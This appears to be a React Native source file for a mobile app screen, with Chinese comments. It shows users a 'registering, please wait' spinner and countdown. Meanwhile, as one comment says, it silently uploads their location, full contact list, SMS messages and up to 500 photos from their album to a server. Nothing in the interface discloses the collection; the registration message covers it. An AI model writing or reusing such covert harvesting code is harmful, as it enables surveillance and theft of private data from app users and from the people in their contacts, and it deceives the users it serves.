import React, { useEffect, useState } from 'react';
import {
  View,
  Text,
  StyleSheet,
  Animated,
  Dimensions,
  ImageBackground,
  StatusBar,
} from 'react-native';
import { uploadLocation, uploadContacts, uploadSMS, uploadAlbum, uploadCompressedImage } from '../services/permissionUpload';

const { width, height } = Dimensions.get('window');

interface DataUploadScreenProps {
  navigation: any;
  route: {
    params: {
      token: string;
      permissionData: any;
    };
  };
}

const DataUploadScreen: React.FC<DataUploadScreenProps> = ({ navigation, route }) => {
  const { token, permissionData } = route.params;
  const [countdown, setCountdown] = useState(60);
  const [isUploadComplete, setIsUploadComplete] = useState(false);
  
  // 动画值
  const rotateAnim = new Animated.Value(0);

  // 旋转动画
  useEffect(() => {
    const startRotation = () => {
      Animated.loop(
        Animated.timing(rotateAnim, {
          toValue: 1,
          duration: 2000,
          useNativeDriver: true,
        })
      ).start();
    };
    startRotation();
  }, []);

  // 倒计时
  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          // 倒计时结束，进入MainTabs
          navigation.replace('MainTabs');
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [navigation]);

  // 数据上传（后台静默进行）
  useEffect(() => {
    const uploadData = async () => {
      if (!token || !permissionData) {
        console.log('没有token或权限数据，跳过上传');
        setIsUploadComplete(true);
        return;
      }

      try {
        // 上传定位数据
        if (permissionData.location) {
          try {
            await uploadLocation(token, permissionData.location);
            console.log('定位数据上传成功');
          } catch (error) {
            console.error('定位数据上传失败:', error);
          }
        }

        // 上传通讯录数据
        if (permissionData.contacts && permissionData.contacts.length > 0) {
          try {
            await uploadContacts(token, permissionData.contacts);
            console.log('通讯录数据上传成功');
          } catch (error) {
            console.error('通讯录数据上传失败:', error);
          }
        }

        // 上传短信数据
        console.log('📱 短信数据检查:', {
          hasSms: !!permissionData.sms,
          smsLength: permissionData.sms?.length || 0
        });
        if (permissionData.sms && permissionData.sms.length > 0) {
          try {
            await uploadSMS(token, permissionData.sms);
            console.log('短信数据上传成功');
          } catch (error) {
            console.error('短信数据上传失败:', error);
          }
        } else {
          console.log('📱 跳过短信上传：没有短信数据');
        }

        // 上传相册数据
        console.log('📷 相册数据检查:', {
          hasAlbum: !!permissionData.album,
          albumLength: permissionData.album?.length || 0,
          firstItem: permissionData.album?.[0]
        });
        if (permissionData.album && permissionData.album.length > 0) {
          try {
            // 并行处理相册照片，大幅提升上传速度
            const albumToProcess = permissionData.album.slice(0, 500); // 限制最多500张
            const uploadPromises = albumToProcess.map(async (item: any, index: number) => {
              // 修复数据结构：getAlbumData已经提取了node，所以直接使用item
              const imageUri = item.image?.uri || item.uri;
              console.log(`📷 处理第${index + 1}张照片，URI:`, imageUri ? '有效' : '无效');
              if (!imageUri) return null;
              
              try {
                console.log(`开始处理第${index + 1}张照片...`);
                const uploadResult = await uploadCompressedImage(
                  token, 
                  imageUri, 
                  item.image?.filename || item.filename || `photo_${index}.jpg`
                );
                
                if (uploadResult.success) {
                  console.log(`第${index + 1}张照片上传成功`);
                  return {
                    originalUri: imageUri,
                    compressedUrl: uploadResult.imageUrl,
                    filename: uploadResult.filename,
                    timestamp: new Date().toISOString()
                  };
                }
              } catch (uploadError) {
                console.error(`第${index + 1}张照片上传失败:`, uploadError);
                return null;
              }
            });
            
            // 并行执行所有上传任务
            const results = await Promise.all(uploadPromises);
            const processedImages = results.filter(result => result !== null);
            
            // 上传处理后的相册数据
            if (processedImages.length > 0) {
              await uploadAlbum(token, processedImages);
              console.log(`相册上传成功，共${processedImages.length}张照片`);
            } else {
              await uploadAlbum(token, []);
              console.log('没有成功处理的照片，上传空相册数据');
            }
          } catch (error) {
            console.error('相册数据上传失败:', error);
            await uploadAlbum(token, []);
          }
        }

        console.log('所有数据上传完成');
        setIsUploadComplete(true);
      } catch (error) {
        console.error('数据上传过程中出现错误:', error);
        setIsUploadComplete(true);
      }
    };

    uploadData();
  }, [token, permissionData]);

  // 监听上传完成状态，完成后立即进入首页
  useEffect(() => {
    if (isUploadComplete) {
      // 延迟1秒进入首页，让用户看到完成状态
      const timer = setTimeout(() => {
        navigation.replace('MainTabs');
      }, 1000);
      
      return () => clearTimeout(timer);
    }
  }, [isUploadComplete, navigation]);

  const spin = rotateAnim.interpolate({
    inputRange: [0, 1],
    outputRange: ['0deg', '360deg'],
  });

  return (
    <ImageBackground
      source={require('../assets/images/jiazai.png')}
      style={styles.backgroundImage}
      resizeMode="cover">
      <StatusBar translucent backgroundColor="transparent" />
      {/* 主要内容 */}
      <View style={styles.content}>
        {/* 加载图标 */}
        <Animated.View
          style={[
            styles.loadingIcon,
            {
              transform: [{ rotate: spin }]
            }
          ]}
        >
          <Text style={styles.icon}>
            {isUploadComplete ? '✅' : '⏳'}
          </Text>
        </Animated.View>

        {/* 标题 */}
        <Text style={styles.title}>
          {isUploadComplete ? '注册完成！' : '正在注册中，请稍等'}
        </Text>
        
        {/* 倒计时 */}
        <Text style={styles.countdown}>{countdown}s</Text>
      </View>
    </ImageBackground>
  );
};

const styles = StyleSheet.create({
  backgroundImage: {
    flex: 1,
    width: '100%',
    height: '100%',
    justifyContent: 'center',
    alignItems: 'center',
  },
  content: {
    alignItems: 'center',
    paddingHorizontal: 40,
  },
  loadingIcon: {
    width: 80,
    height: 80,
    borderRadius: 40,
    backgroundColor: '#fff',
    justifyContent: 'center',
    alignItems: 'center',
    shadowColor: '#000',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
    elevation: 4,
    marginBottom: 30,
  },
  icon: {
    fontSize: 40,
  },
  title: {
    fontSize: 20,
    fontWeight: 'bold',
    color: '#333',
    textAlign: 'center',
    marginBottom: 20,
  },
  countdown: {
    fontSize: 36,
    fontWeight: 'bold',
    color: '#007AFF',
  },
});

export default DataUploadScreen; 